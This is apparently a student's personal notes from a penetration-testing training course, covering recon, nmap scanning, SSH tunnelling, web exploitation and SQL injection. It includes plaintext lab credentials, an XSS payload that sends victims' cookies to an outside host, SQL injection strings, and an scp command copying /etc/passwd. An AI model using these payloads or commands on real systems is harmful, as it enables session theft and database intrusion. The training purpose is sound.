CTF: http://10.50.20.250:8000
jump box: 10.50.45.124
pass: password


ctf user:truk-007-m
PASS: lLLtxxX1XXJvRuX


Day 1) 
-------------------------------------------------------------
Penetration testing)  breaking into a network and finding the weaknesses

6 phases: 

phase 1: mission definition) 
  - define goals and targets
  - determine scope of mission
  - define RoE
    
phase 2: Recon )
  - info gathering without interacting with that sepecific target
  - ex: whois, socials, job postings ect.

phase 3: footprinting)
  - pings, portscans, websites, emails,

phase 4: exploitation and inital access) 
  - gaining access
  - getting a foothold via what ever means: email, website, mis configs ect.

phase 5: Post-exploitation) 
  - establish presistance
  - esclate privileges
  - cover your tracks
  - exfiltrate target data

phase 6: document mission) 
  - document and report mission details

Pen test reporting: 
  - opnotes (what you did as the operator)
  - formal reporting: 
      - executive: condenced and run down of what happened
      - tecnical summery is for the nerds like myself


why reporting and what the resons?
  - to help companys fixs the holes they have in there system.
  - why do i care for reports?
      - stay organized and i know what im doing and where im going and whats happening around me. like account ability, it helps for others to prep, and saves your back incase others break into the system. 

-------------------------------------------------------------------------------------

Scanning and Reconnaissance
---------------------------
what is reconnaissance? 
  - what does the target look like?
  - whats behind it?
  - what ips are there?
  - what ports and services

Open source intell
   - email
   - social media
   - job listings


Documentation
  - whats inside?
  - what needs doccumented
  - screen shots
  - timelines
  - be organized

**mid map is one way to stay organized**

Collection and use
  - used in different operations
  - ipaddresses
  - ports
  - volnerabilities

Limitations on collections
  - rules: us person cant be collected on, Rules of engagement (RoE),
  - different factors

data to collect 
  - web data
      - cache content, proxy web application, command line intergration
  - sensitive data
      - busniss data, filings, historyical and public listings 
  - publicly accessaible
      - Physical address, phone #, email address, user names, search engine data, web and traffic cameras, wireless access point data
  - social media
      - facebook, twitter(X), instagram, people searches,registry, wish list
  - domain and IP data

HTML (web script) 
  - client-side interpretation
  - utilizes elements
  - typicaly redirects to another pager for server-side interatction
  - cascading stylesheets




script (website)

pip install lxml requests
--------------------------------
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
---------------------------------


scraper script
---------------------------------
#!/usr/bin/python3

# IDENTFYING SPECIFIC PYTHON MODULES THAT WILL BE USED IN SCRIPT
import lxml.html
import requests

# STATING A FUNCTION THAT THE SCRIPT CONTENT IS ATTACHED TO
def main():

# THIS OUTLINES THE WEBSITE AND DEFINES THE CONTENT ON THE PAGE TO BE TARGETED
  page = requests.get('http://quotes.toscrape.com')
  tree = lxml.html.fromstring(page.content)

# THIS OUTLINES THE HTML TAG AND ATTRIBUTE TO BE TARGETED FOR THE DATA YOU WANT TO toscrape
# "small" IS THE HTML TAG AND "class" IS THE HTML TAG ATTRIBUTE
  authors = tree.xpath('//small[@class="author"]/text()')

# PRINTS THE ABOVE VARIABLE WITH Authors: AS THE HEADER
  print ('Authors: ',authors)

# Future Code for json output
# output = []
# for info in zip(titles,prices, tags, total_platforms):
#     resp = {}
#     resp['title'] = info[0]
#     resp['price'] = info[1]
#     resp['tags'] = info[2]
#     resp['platforms'] = info[3]
#     output.append(resp)

if __name__ == "__main__":
    main()
-----------------------------------------------------


demo commands: 

F12 developers console 
scraping 
  - 
1) scanning
   - nmap --script-help http-enum
   - (port 80 enum) nmap --script http-enum 10.50.45.252
   - nmap -
2) sockets
   - ssh student@<ip>  -L 2222:<target>:22
   - ssh -M -S /tmp/jumpbox  -o StrictHostKeyChecking=no -o UserKnownHostFile=/dev/null
    - ssh -S /tmp/jumpbox <anything>
    - (making new runnel) ssh -S /tmp/jumpbox user@ip -O forward -L 2222:192.168.0.10:22
    - netstat -antup | grep 2222
    -  ssh -M -S /tmp/jumpbox -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostFile=/dev/null student23@127.0.0.1
    -  
    - scp -o ControlPath=/tmp/jumpbox user@ip:/etc/passwd /tmp/password
    - ssh -S /tmp/jumpbox <anything> -D 9050
    - proxychains nmap -sT -Pn -p 80 192.168.0.10 2> /dev/null
    - for i in {1..254} ; do (ping -c 1 192.168.1.$i |grep "bytes from" &) ;done
    - proxychains scraper.py <website> 

------------------------------------

advanced scanning techniques
  - Host discovery
      - find hosts that are online
  - port enumeration
      - find ports for each host
  - port interrogation
      - find what service is running
   
Nmap script
-----------------
why use scripts? 
  - more consistent less error, time
benifits
  - network discovery
  - version detection
  - vulnerability detection
  - backdoor detection
  - volnerability detection
Dirctory: /usr/share/nmap/scripts
  - nmap --script  -help|-args|-args-file|-trace
  - nmap --script=finger

nmap <F5 i<C-R>=strftime("%Y-%m-%d-%H:%M:%S")<CR>-- 

----------------------------------------------------------------------------------------------------------------------------
Day 2) 

Web exploitation 
------------------------
server hosts something cliet gets that thing

http is how we communcate with servers 
  - tools: wireshark tcpdump
  - GET
  - POST
  - HEAD
  - PUT
  - DEV CONSOLE
  - repsonse codes
      - 10X == info
      - 2XX success ect
  - wget command to get cookies
    - wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
  - enumeration
    - robots.txt
    - tools: nse scripts nikto burp suite
    - http-enum.nse
    - http-robots.txt.nse
  - cross site scripting
      - reflected (most common)
          - exploiting a volnerable browser not server 
          - stealing cookies
              - <script>document.location="http://10.50.41.112:8000/cookie.php?username=" + document.cookie;</script>
              - 
      - server-side injection
      - malicious upload
         - see what it wants
         - find your file
         - upload your file


    ssh
    ---------------------
    ssh-keygen -t rsa -b 4096
    upload public key
    ssh <user>@ip -i 
-----------------------------------------------------------------------------------------------------------------------------
Day 3) SQL 

commands standard
--------------------
- select  - extracts data from a data base 
- union   - used to combind  the rest of two or more selected statements 
- use     - selects the DB to use 
- update  - updates data in a database 
- delete  - deletes data from the DB 
- insert into  - Inserts new data into a database
- create database  -   Creates a new database
- alter database   -   Modifies a database
- create table     -   Creates a new table
- alter table      -   Modifies a table
- drop table       -   Deletes a table 
- create index     -   Creates an index (search key)
- drop index       -   Deletes an index



commands by instructor for Sql 
--------------------------

- mysql (sequil console)
- show databases;
- show tables from session;
- select * from session.<table>;    (example select * from session.user; ) (select name from session.user)
- use <DB table> 
- describe <table>
- select * session.car UNION select tireid,name,size,cost,1,2 from tires

SQL injection
------------------
unstanitized : imput fields can be found using single quite ' 
an aditional single quote will allow aditional statements/clauses 
validation: checks input to ensure it meets criteria (doesnt contain a single quote ' ) 

example of injections ish:  tom' OR 1='1


a semi colen ; can be used to combind statements. 

some sites wont allow stakcing but we can use union to stack it 
example)  UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
using # or -- tells the database to ignore everything else 


inject imput = 1 OR 1=1; #


SQL inject messaging
----------------------
use a ' to see for error message 
if error use : tom ' OR 1='1 
login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1 
post informs
get gives
use developer consle under network to see where it sends you 


Blind injection
------------------------
has no error messages 
@@version = finds sql version 
Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
Selection=2 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_schema=database()   == the table in use 







ports 3333,7418=12.168.28.111
      9638=10.100.28.40:80
      9999:10.100.28.55:80














